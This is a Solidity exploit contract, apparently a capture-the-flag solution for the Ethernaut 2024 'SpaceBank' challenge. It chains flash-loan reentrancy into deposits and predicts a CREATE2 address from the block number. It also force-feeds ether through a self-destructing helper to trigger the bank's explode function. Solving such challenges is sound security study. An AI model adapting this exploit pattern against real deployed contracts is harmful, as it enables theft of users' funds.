// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "src/EthernautCTF_2024/SpaceBank/Challenge.sol";
import "forge-std/console2.sol";

contract Helper {
    constructor(address target) {
        selfdestruct(payable(target));
    }
}

contract SpaceBankAttack {
    Challenge public challenge;
    SpaceBank public spaceBank;
    IERC20 public token;
    uint flag = 0;
    uint magic = 0;

    constructor(Challenge _challenge) payable {
        challenge = _challenge;
        spaceBank = _challenge.SPACEBANK();
        token = spaceBank.token();
        token.approve(address(spaceBank), type(uint256).max);
    }

    function solve() public {
        spaceBank.flashLoan(100, address(this));
    }

    function finish() public {
        spaceBank.flashLoan(100, address(this));
    }

    function executeFlashLoan(uint256) public {
        if (flag == 0) {
            magic = uint256(block.number) % 47;
            spaceBank.deposit(100, abi.encode(magic));
            flag += 1;
            spaceBank.flashLoan(900, address(this));
        } else if (flag == 1){
            flag += 1;
            bytes memory bytecode = type(Helper).creationCode;
            bytes memory contractBytecode = abi.encodePacked(bytecode, abi.encode(address(spaceBank)));
            address helperAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(spaceBank), bytes32(block.number), keccak256(contractBytecode))))));
            helperAddress.call{value: 1 wei}("");
            spaceBank.deposit(token.balanceOf(address(this)), contractBytecode);
        } else if (flag == 2) {
            flag += 1;
            spaceBank.flashLoan(900, address(this));
        } else {
            spaceBank.explodeSpaceBank();
            token.transfer(address(spaceBank), 1000);
        }
    }

}